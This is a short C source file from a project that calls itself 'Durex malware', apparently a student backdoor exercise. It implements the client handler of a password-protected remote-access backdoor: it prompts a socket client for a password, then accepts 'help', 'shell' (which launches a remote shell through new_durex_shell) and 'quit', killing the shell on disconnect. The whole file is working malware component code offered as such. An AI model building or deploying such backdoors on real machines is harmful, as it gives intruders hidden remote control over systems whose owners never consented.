#include "durex.h"

int			client_slot(void)
{
	for (int i = 0;i < MAX_CLIENT; i++) {
		if (get_durex()->clients[i].used == false) {
			return (i);
		}
	}
	return (-1);
}

void		new_client(t_client *client)
{
	char 	buf[101];
	int		ret;
	BOOLEAN	login = false;

	dprintf(client->socket, "Enter password : ");
	client->token = ft_strnew(0);
	while(42)
	{
		bzero(buf, 100);
		ret = read(client->socket, (void *)buf, 100);
		if (ret == -1)//disconnected
		{
			break;
		}
		if (ret > 0)
		{
			buf[ret - 1] = '\0';
			if (!login)
			{
				if (compare_passwrd(buf) == true)
				{
					dprintf(client->socket, "Welcome to Durex malware : \n");
					client->token = ft_dstrjoin("secu.", strdup(buf), 2);
					login = 1;
				}
				else
				{
					break ;
				}
			}
			else if (login) //logged zone
			{
				//secu ++ {
				char **split = ft_split_string(client->token, ".");
				if (array_length(split) != 2 || compare_passwrd(split[1]) == false)
				{
					free_array(split);
					break ;
				}
				//secu ++ }
 				if (strncmp(buf, "help", 4) == 0)
				{
					dprintf(client->socket, HELP);
				}
				else if (strncmp(buf, "shell", 5) == 0)
				{
					new_durex_shell(get_durex(), client);
				}
				else if (strncmp(buf, "quit", 4) == 0)
				{
					dprintf(client->socket, "Goodbye !\n");
					break ;
				}
				else
				{
					dprintf(client->socket, "%s command not found. Try : help \n", buf);
				}
				//secu ++ {
				free_array(split);
				//secu ++ }
			}
		}
	}
	dprintf(client->socket, "CLOSE CONNECTION\n");
	if (client->shell_port != -1 && client->shell_pid != -1)
		kill(client->shell_pid, SIGKILL);
	close(client->socket);
	client->used = false;
	free(client->token);
}
